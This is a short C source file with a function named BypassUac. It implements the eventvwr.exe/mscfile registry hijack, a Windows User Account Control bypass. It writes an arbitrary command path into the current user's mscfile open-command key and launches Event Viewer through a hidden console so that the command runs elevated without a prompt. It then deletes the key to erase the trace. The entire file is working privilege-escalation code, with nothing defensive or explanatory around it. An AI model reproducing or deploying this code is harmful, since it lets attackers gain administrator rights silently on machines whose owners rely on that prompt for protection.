#include "BypassUac.h"


void BypassUac(char *szRunPath){
	
	//set the reg keyvalue
	SHSetValue(
		HKEY_CURRENT_USER,
		"Software\\Classes\\mscfile\\shell\\open\\command",
		NULL,REG_SZ,
		szRunPath,
		strlen(szRunPath));

	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
    ZeroMemory( &pi, sizeof(pi) );

	//system("cmd.exe /c eventvwr.exe");
	//WinExec("cmd.exe /c eventvwr.exe",SW_HIDE);

    // Start the child process. 
    if( !CreateProcess( 
		NULL,   // No module name (use command line)
        "cmd.exe /c eventvwr.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,              // hidden the console windows
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        //printf( "CreateProcess failed (%d).\n", GetLastError() );
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );


	//delete key
	SHDeleteKey(
		HKEY_CURRENT_USER,
		"Software\\Classes\\mscfile\\shell\\open\\command"
		);

}


